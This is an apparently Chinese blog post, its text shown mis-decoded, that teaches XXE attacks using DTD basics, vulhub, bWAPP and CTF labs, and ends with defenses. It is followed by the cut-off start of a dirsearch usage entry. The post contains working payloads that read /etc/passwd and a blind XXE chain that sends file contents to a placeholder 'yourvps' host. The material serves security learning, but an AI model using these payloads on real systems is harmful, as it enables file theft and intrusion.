æ–‡æ¡£ç›¸åŒï¼Œä½†æ˜¯æ‹¥æœ‰ä¸€ä¸ªå¤–éƒ¨çš„ DTD<br>è¿™æ˜¯åŒ…å« DTD çš„ â€œnote.dtdâ€ æ–‡ä»¶ï¼š<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ELEMENT<span class="built_in"> note </span>(<span class="keyword">to</span>,<span class="keyword">from</span>,heading,body)&gt;</span><br><span class="line">&lt;!ELEMENT <span class="keyword">to</span> (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT <span class="keyword">from</span> (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT body (#PCDATA)&gt;</span><br></pre></td></tr></table></figure></p><h2 id="DTDå®ä½“å£°æ˜"><a href="#DTDå®ä½“å£°æ˜" class="headerlink" title="DTDå®ä½“å£°æ˜"></a>DTDå®ä½“å£°æ˜</h2><p>é‡ç‚¹ä»‹ç»å®ä½“å£°æ˜<br><strong>å†…éƒ¨å®ä½“å£°æ˜</strong><br><code>&lt;!ENTITY å®ä½“åç§° &quot;å®ä½“çš„å€¼&quot;&gt;</code><br>DTD ä¾‹å­:<br><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY writer <span class="string">"Bill Gates"</span>&gt;</span><br></pre></td></tr></table></figure></p><p>å°†writer å£°æ˜ä¸ºâ€Bill Gatesâ€ï¼Œcopyright å£°æ˜ä¸º â€œCopyright W3School.com.cnâ€<br>XML ä¾‹å­:<br><code>&lt;author&gt;&amp;writer;&amp;copyright;&lt;/author&gt;</code><br>æ³¨é‡Š: ä¸€ä¸ªå®ä½“ç”±ä¸‰éƒ¨åˆ†æ„æˆ: ä¸€ä¸ªå’Œå· (&amp;), ä¸€ä¸ªå®ä½“åç§°, ä»¥åŠä¸€ä¸ªåˆ†å· (;)ã€‚<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE foo [</span></span><br><span class="line"><span class="meta">&lt;!ENTITY xxe  "sec test" &gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p><strong>å¤–éƒ¨å®ä½“å£°æ˜</strong><br>å¤–éƒ¨å®ä½“å¼•ç”¨æ”¯æŒé€šè¿‡åè®®ï¼Œæ¥åŠ¨æ€çš„è·å–å€¼<br><code>&lt;!ENTITY å®ä½“åç§° SYSTEM &quot;URI/URL&quot;&gt;</code><br>ä¾‹å­ï¼š<br>DTD ä¾‹å­:<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY writer<span class="built_in"> SYSTEM </span><span class="string">"http://www.w3school.com.cn/dtd/entities.dtd"</span>&gt;</span><br><span class="line">&lt;!ENTITY copyright<span class="built_in"> SYSTEM </span><span class="string">"http://www.w3school.com.cn/dtd/entities.dtd"</span>&gt;</span><br></pre></td></tr></table></figure></p><p>XML ä¾‹å­:<br><code>&lt;author&gt;&amp;writer;&amp;copyright;&lt;/author&gt;</code><br>å¯ä»¥é€šè¿‡<code>file://</code>åè®®æ¥è¯»å–æ–‡ä»¶å†…å®¹<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE foo [</span></span><br><span class="line"><span class="meta">&lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>ä¸åŒè¯­è¨€æ”¯æŒçš„åè®®ä¸åŒ<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g2rk26rhefj30ge05m0u0.jpg" alt=""></p><p><strong>å‚æ•°å®ä½“</strong>ï¼š<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % å®ä½“åç§° <span class="string">"å®ä½“çš„å€¼"</span>&gt;</span><br><span class="line"><span class="keyword">or</span></span><br><span class="line">&lt;!ENTITY % å®ä½“åç§°<span class="built_in"> SYSTEM </span><span class="string">"URI"</span>&gt;</span><br></pre></td></tr></table></figure></p><p>å‚æ•°å®ä½“åªèƒ½åœ¨DTDä¸­ç”³æ˜ï¼ŒDTDä¸­å¼•ç”¨ï¼Œå®ƒä»¬ä½¿ç”¨ç™¾åˆ†å·(%)è€Œä¸æ˜¯ä¸å­—ç¬¦(&amp;)ï¼Œå¯ä»¥æ˜¯å‘½åå®ä½“æˆ–å¤–éƒ¨å®ä½“ã€‚ï¼Œèƒ½å¤Ÿè§£æå®ä½“æˆ–è€…uriï¼Œè¿›è¡Œxmlè§£æï¼Œè¿›è€Œè·å¾—å…¶ä¸­çš„å˜é‡<br>æ³¨:ä¸€èˆ¬ç”¨äºBline XXE<br><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY <span class="comment">% style "2333"&gt;</span></span><br><span class="line">&lt;!ENTITY <span class="comment">% test "%style"&gt;</span></span><br></pre></td></tr></table></figure></p><p><strong>å…¬å…±å®ä½“å£°æ˜</strong><br><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY å®ä½“åç§° PUBLIC <span class="string">"public_ID"</span> <span class="string">"URI"</span>&gt;</span><br></pre></td></tr></table></figure></p><h1 id="XXEæ¼æ´"><a href="#XXEæ¼æ´" class="headerlink" title="XXEæ¼æ´"></a>XXEæ¼æ´</h1><p>å½“å…è®¸å¼•ç”¨å¤–éƒ¨å®ä½“æ—¶ï¼Œé€šè¿‡æ„é€ æ¶æ„å†…å®¹ï¼Œå¯å¯¼è‡´è¯»å–ä»»æ„æ–‡ä»¶ã€æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€æ¢æµ‹å†…ç½‘ç«¯å£ã€æ”»å‡»å†…ç½‘ç½‘ç«™ç­‰å±å®³ã€‚<br>xxeæ¼æ´è§¦å‘çš„ç‚¹å¾€å¾€æ˜¯å¯ä»¥ä¸Šä¼ xmlæ–‡ä»¶çš„ä½ç½®ï¼Œæ²¡æœ‰å¯¹ä¸Šä¼ çš„xmlæ–‡ä»¶è¿›è¡Œè¿‡æ»¤ï¼Œå¯¼è‡´å¯ä¸Šä¼ æ¶æ„xmlæ–‡ä»¶</p><p>å¦‚æœxmlèƒ½å¤Ÿè¢«è§£æï¼Œæ¯”å¦‚è¾“å…¥<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE ANY [</span></span><br><span class="line"><span class="meta">&lt;!ENTITY name "my name is nMask"&gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span>&amp;name;<span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>å¦‚æœé¡µé¢è¾“å‡ºäº†my name is nMaskï¼Œè¯´æ˜xmlæ–‡ä»¶å¯ä»¥è¢«è§£æã€‚</p><p>æ¥ä¸‹æ¥æµ‹è¯•æ˜¯å¦æ”¯æŒDTDå¼•ç”¨å¤–éƒ¨å®ä½“è€Œå¯¼è‡´xxeæ³¨å…¥<br><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="meta">&lt;?xml version=â€1.0â€ encoding=â€UTF-8â€?&gt;</span></span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!DOCTYPE ANY [</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">name</span> <span class="attr">SYSTEM</span> "<span class="attr">http:</span>//<span class="attr">localhost</span>/<span class="attr">index.html</span>"&gt;</span></span></span><br><span class="line"><span class="xml"></span><span class="perl">%name;</span><span class="xml"></span></span><br><span class="line"><span class="xml">]&gt;</span></span><br></pre></td></tr></table></figure></p><p>å¯é€šè¿‡æŸ¥çœ‹è‡ªå·±æœåŠ¡å™¨ä¸Šçš„æ—¥å¿—æ¥åˆ¤æ–­ï¼Œçœ‹ç›®æ ‡æœåŠ¡å™¨æ˜¯å¦å‘ä½ çš„æœåŠ¡å™¨å‘äº†ä¸€æ¡è¯·æ±‚index.htmlçš„è¯·æ±‚ã€‚</p><p>æ¥ä¸‹é‡Œå®‰è£…æ¼æ´ç¯å¢ƒ</p><p>æœ¬äººåœ¨centosä¸‹ï¼Œå®‰è£…dockerå<br>git clone <a href="https://github.com/vulhub/vulhub.git" target="_blank" rel="noopener">https://github.com/vulhub/vulhub.git</a><br>è¿›å…¥/vulhub/vulhub/tree/master/php/php_xxe<br>è¾“å…¥<code>pip install docker-compose</code>å³å¯<br>ç¯å¢ƒå¯åŠ¨åï¼Œè®¿é—®<a href="http://your-ip:8080/index.phpå³å¯çœ‹åˆ°phpinfo" target="_blank" rel="noopener">http://your-ip:8080/index.phpå³å¯çœ‹åˆ°phpinfo</a></p><p>wwwç›®å½•åŒ…å«å››ä¸ªæ–‡ä»¶<br><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">â”œâ”€â”€ dom.php <span class="meta"># ç¤ºä¾‹ï¼šä½¿ç”¨DOMDocumentè§£æbody</span></span><br><span class="line">â”œâ”€â”€ <span class="keyword">index</span>.php <span class="meta">#phpinfo()</span></span><br><span class="line">â”œâ”€â”€ SimpleXMLElement.php <span class="meta"># ç¤ºä¾‹ï¼šä½¿ç”¨SimpleXMLElementç±»è§£æbody</span></span><br><span class="line">â””â”€â”€ simplexml_load_string.php <span class="meta"># ç¤ºä¾‹ï¼šä½¿ç”¨simplexml_load_stringå‡½æ•°è§£æbody</span></span><br><span class="line">`</span><br></pre></td></tr></table></figure></p><p>SimpleXMLElement.php<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$data = file_get_contents(<span class="string">'php://input'</span>);</span></span><br><span class="line"><span class="php">$xml = <span class="keyword">new</span> SimpleXMLElement($data);  <span class="comment">//è§£æxml</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $xml-&gt;name;</span></span><br></pre></td></tr></table></figure></p><p>dom.php<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$data = file_get_contents(<span class="string">'php://input'</span>);</span></span><br><span class="line"><span class="php">$dom = <span class="keyword">new</span> DOMDocument();</span></span><br><span class="line"><span class="php">$dom-&gt;loadXML($data);</span></span><br><span class="line"><span class="php">print_r($dom);</span></span><br></pre></td></tr></table></figure></p><p>simplexml_load_string.php<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$data = file_get_contents(<span class="string">'php://input'</span>);</span></span><br><span class="line"><span class="php">$xml = simplexml_load_string($data);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $xml-&gt;name;</span></span><br></pre></td></tr></table></figure></p><p>é¦–å…ˆæµ‹è¯•æ˜¯å¦èƒ½å¤Ÿè§£æxml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE root [</span></span><br><span class="line"><span class="meta">&lt;!ENTITY writer "Bill Gates"&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY copyright "Copyright W3School.com.cn"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>&amp;writer;&amp;copyright;<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g2vh6q4wo1j30o60bct9m.jpg" alt=""><br><strong>å†…éƒ¨å®ä½“</strong><br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g2wcj6j2ikj30i50ae74o.jpg" alt=""></p><p><strong>å¤–éƒ¨å®ä½“</strong><br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE root[</span></span><br><span class="line"><span class="meta">&lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g2vhxcxhcqj30zr0fjq57.jpg" alt=""></p><p><strong>å‚æ•°å®ä½“</strong></p><p>å½“æ²¡æœ‰å›æ˜¾å³æ²¡æœ‰è¿™ä¸ªè¯­å¥çš„æ—¶å€™<code>echo $xml-&gt;name;</code>è¯¥æ€ä¹ˆåŠå‘¢<br>è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å¯ä»¥åˆ©ç”¨å‚æ•°å®ä½“ï¼Œé€šè¿‡å‘èµ·httpè¯·æ±‚æ¥æ”»å‡»ã€‚</p><p>å…ˆè¿›è¡Œå‚æ•°å®ä½“å£°æ˜çœ‹çœ‹~<br>åœ¨è¿œç¨‹æœåŠ¡å™¨æ–°å»ºxxe.dtdæ–‡ä»¶ï¼Œå†…å®¹ä¸ºï¼š<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY evil<span class="built_in"> SYSTEM </span><span class="string">"file:///etc/passwd"</span> &gt;</span><br></pre></td></tr></table></figure></p><p>xmlå†…å®¹ä¸º<br><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="meta">&lt;!DOCTYPE foo [</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">!ENTITY</span>  % <span class="attr">xxe</span> <span class="attr">SYSTEM</span> "<span class="attr">http:</span>//<span class="attr">ip</span>/<span class="attr">xxe.dtd</span>" &gt;</span></span></span><br><span class="line"><span class="xml"></span><span class="perl">%xxe;</span><span class="xml"></span></span><br><span class="line"><span class="xml">]&gt;</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">name</span>&gt;</span>&amp;evil;<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g2xdsskoncj30zi0c40uv.jpg" alt=""><br>ç›¸å½“äº:<br><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="meta">&lt;!DOCTYPE foo [</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">!ENTITY</span>  % <span class="attr">xxe</span> "&lt;!<span class="attr">ENTITY</span> <span class="attr">evil</span> <span class="attr">SYSTEM</span> '<span class="attr">file:</span>///<span class="attr">etc</span>/<span class="attr">passwd</span>'&gt;</span>" &gt;</span></span><br><span class="line"><span class="xml"></span><span class="perl">%xxe;</span><span class="xml"></span></span><br><span class="line"><span class="xml">]&gt;</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">name</span>&gt;</span>&amp;evil;<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g2xdwdbbauj30z90boac5.jpg" alt=""></p><p>å¦‚æœç›®æ ‡æœåŠ¡å™¨æ²¡æœ‰å›æ˜¾ï¼Œå°±åªèƒ½ç”¨ Blind XXE äº†ã€‚åŸç†å°±æ˜¯å¸¦ç€è·å–çš„æ–‡ä»¶æºç ä»¥ get å‚æ•°æˆ–å…¶ä»–å½¢å¼å»è®¿é—®æˆ‘ä»¬çš„æœåŠ¡å™¨ï¼Œç„¶ååœ¨æ—¥å¿—é‡Œå°±å¯ä»¥æ‰¾åˆ°æˆ‘ä»¬è¦è·å–çš„å†…å®¹äº†ã€‚</p><p>å…ˆåœ¨æˆ‘çš„æœåŠ¡å™¨å»ºä¸€ä¸ªxxe.xmlæ–‡ä»¶,å†…å®¹ä¸ºï¼š<br><figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!<span class="keyword">ENTITY</span> % <span class="keyword">all</span> <span class="string">"&lt;!ENTITY send SYSTEM 'http://yourvps/%file;'&gt;"</span>&gt;</span><br></pre></td></tr></table></figure></p><p>æ¥ä¸‹æ¥è¯»å–å†…å®¹ï¼Œæˆ‘ä»¬æäº¤<br><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!DOCTYPE data [</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">file</span> <span class="attr">SYSTEM</span> "<span class="attr">php:</span>//<span class="attr">filter</span>/<span class="attr">convert.base64-encode</span>/<span class="attr">resource</span>=<span class="string">index.php</span>"&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">dtd</span> <span class="attr">SYSTEM</span> "<span class="attr">http:</span>//<span class="attr">yourvps</span>/<span class="attr">xxe.xml</span>"&gt;</span></span></span><br><span class="line"><span class="xml"></span><span class="perl">%dtd; %all;</span><span class="xml"></span></span><br><span class="line"><span class="xml">]&gt;</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">value</span>&gt;</span>&amp;send;<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p><p>æ•´ä¸ªçš„è°ƒç”¨è¿‡ç¨‹å¦‚ä¸‹ï¼šè§£ææ—¶%dtdå¼•å…¥xxe.xmlï¼Œä¹‹å%allå¼•å…¥sendçš„å®šä¹‰ï¼Œæœ€åå¼•ç”¨äº†å®ä½“sendï¼ŒæŠŠ%fileæ–‡ä»¶å†…å®¹é€šè¿‡ä¸€ä¸ªhttpè¯·æ±‚å‘äº†å‡ºå»ã€‚æ³¨æ„éœ€è¦æŠŠpayloadç»è¿‡urlç¼–ç ã€‚</p><p>ç„¶ååœ¨æœåŠ¡å™¨çš„logä¸­çœ‹åˆ°base64åŠ å¯†åçš„å†…å®¹(/var/log/httpd/access.log)<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g337a098y7j30ph06owen.jpg" alt=""></p><h2 id="ä½¿ç”¨bWappå­¦ä¹ "><a href="#ä½¿ç”¨bWappå­¦ä¹ " class="headerlink" title="ä½¿ç”¨bWappå­¦ä¹ "></a>ä½¿ç”¨bWappå­¦ä¹ </h2><p>ç¯å¢ƒæ­å»º:<br>vulstudyæ˜¯ä¸“é—¨æ”¶é›†å½“ä¸‹æµè¡Œçš„æ¼æ´å­¦ä¹ å¹³å°,ç°åœ¨ç”¨å®ƒæ¥ä¸€é”®æ­å»ºbWapp<br>ä¸‹è½½vulstudyé¡¹ç›®<br>git clone <a href="https://github.com/c0ny1/vulstudy.git" target="_blank" rel="noopener">https://github.com/c0ny1/vulstudy.git</a><br>cd vulstudy/bWapp<br>docker-compose up -d #å¯åŠ¨å®¹å™¨<br>æ³¨:ç¬¬ä¸€æ¬¡åˆ›å»ºåº”äº‹å…ˆè®¿é—®/install.phpæ¥åˆ›å»ºæ•°æ®åº“<br>å®‰è£…å¥½ä¹‹åï¼ŒChoose your bug é€‰æ‹© XML External Entity Attacks (XXE)<br>å…ˆæŠ“åŒ…<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g337pc5fb8j30ei05p75j.jpg" alt=""></p><p>xxe-1.phpé¡µé¢åœ¨å‘xxe-2.phpé¡µé¢ä¼ è¾“æ•°æ®è¿‡ç¨‹ä¸­ï¼Œå…¶ä¸­çš„xmlæ•°æ®æ˜¯å¯æ§çš„ï¼Œä¹Ÿå°±æ˜¯è¯´å¯ä»¥æ„é€ æ¶æ„æ•°æ®è¿›è¡Œä¼ è¾“ï¼Œæ·»åŠ ä¸€ä¸ªå¤–éƒ¨å®ä½“åœ¨XMLæ•°æ®ä¸­è¿›è¡Œå®ä½“è°ƒç”¨ï¼Œä»è€Œè¿›è¡ŒXXEæ”»å‡»ã€‚</p><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g337r3kctyj31qm0jgdjc.jpg" alt=""></p><h2 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h2><p><a href="http://web.jarvisoj.com:9882/" target="_blank" rel="noopener">http://web.jarvisoj.com:9882/</a><br>è·å¾—ç›®æ ‡æœºå™¨/home/ctf/flag.txtä¸­çš„flagå€¼ã€‚<br>å°†Content-Typeçš„å€¼æ”¹ä¸ºapplication/xmlï¼Œç„¶åæäº¤xmlå‘ç°èƒ½å¤Ÿè¢«è§£æ<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g2wpe05i33j30rc0b5jsf.jpg" alt=""><br>äºæ˜¯ä¿®æ”¹payloadä¸º:<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE foo [</span></span><br><span class="line"><span class="meta">&lt;!ENTITY xxe SYSTEM "file:///home/ctf/flag.txt" &gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g2wph8hlvij30wj0cldh4.jpg" alt=""></p><h1 id="é˜²å¾¡"><a href="#é˜²å¾¡" class="headerlink" title="é˜²å¾¡"></a>é˜²å¾¡</h1><p>ç¦ç”¨å¤–éƒ¨å®ä½“<br>php</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libxml_disable_entity_loader(<span class="name">true</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure><p>java</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DocumentBuilderFactory dbf =DocumentBuilderFactory.<span class="keyword">new</span><span class="type">Instance</span>();</span><br><span class="line">dbf.setExpandEntityReferences(<span class="literal">false</span>);</span><br></pre></td></tr></table></figure><p>python</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml import etree</span><br><span class="line">xmlData = etree.parse(xmlSource,etree.XMLParser(<span class="attribute">resolve_entities</span>=<span class="literal">False</span>))</span><br></pre></td></tr></table></figure><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://blog.csdn.net/com_ma/article/details/73277535" target="_blank" rel="noopener">https://blog.csdn.net/com_ma/article/details/73277535</a><br><a href="https://github.com/c0ny1/xxe-lab" target="_blank" rel="noopener">https://github.com/c0ny1/xxe-lab</a><br><a href="https://www.freebuf.com/articles/web/126788.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/126788.html</a><br><a href="https://www.freebuf.com/column/188849.html" target="_blank" rel="noopener">https://www.freebuf.com/column/188849.html</a><br><a href="https://www.ibm.com/developerworks/cn/xml/x-entities/" target="_blank" rel="noopener">https://www.ibm.com/developerworks/cn/xml/x-entities/</a></p>]]></content>
      
      
      <categories>
          
          <category> webå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webå®‰å…¨ </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ç›®å½•çˆ†ç ´æ‰«æå·¥å…·dirsearch</title>
      <link href="/2019/06/01/%E7%9B%AE%E5%BD%95%E7%88%86%E7%A0%B4%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7dirsearch/"/>
      <url>/2019/06/01/%E7%9B%AE%E5%BD%95%E7%88%86%E7%A0%B4%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7dirsearch/</url>
      
        <content type="html"><![CDATA[<p><meta name="referrer" content="no-referrer"><br>github <a href="https://github.com/maurosoria/dirsearch" target="_blank" rel="noopener">https://github.com/maurosoria/dirsearch</a></p><p>å‚æ•°åˆ—è¡¨ï¼š</p><p>-h, â€“help   æŸ¥çœ‹å¸®åŠ©<br>-u URL, â€“url=URL   è®¾ç½®url<br>-L URLLIST, â€“url-list=URLLIST  è®¾ç½®urlåˆ—è¡¨<br>-e EXTENSIONS, â€“extensions=EXTENSIONS  ç½‘ç«™è„šæœ¬ç±»å‹<br>-w WORDLIST, â€“wordlist=WORDLIST  è®¾ç½®å­—å…¸ ï¼ˆå¸¦ä¸Šè·¯å¾„ï¼‰<br>-l, â€“lowercase  å°å†™<br>-f, â€“force-extensions  å¼ºåˆ¶æ‰©å±•å­—å…¸é‡Œçš„æ¯ä¸ªè¯æ¡<br>-s DELAY, â€“delay=DELAY   è®¾ç½®è¯·æ±‚ä¹‹é—´çš„å»¶æ—¶<br>-r, â€“recursive     Bruteforce recursively  é€’å½’åœ°æ‰«æ<br>â€“scan-subdir=SCANSUBDIRS, â€“scan-subdirs=SCANSUBDIRS  æ‰«æç»™å®šçš„urlçš„å­ç›®å½•(ç”¨é€—å·éš”å¼€)<br>â€“exclude-subdir=EXCLUDESUBDIRS, â€“exclude-subdirs=EXCLUDESUBDIRS  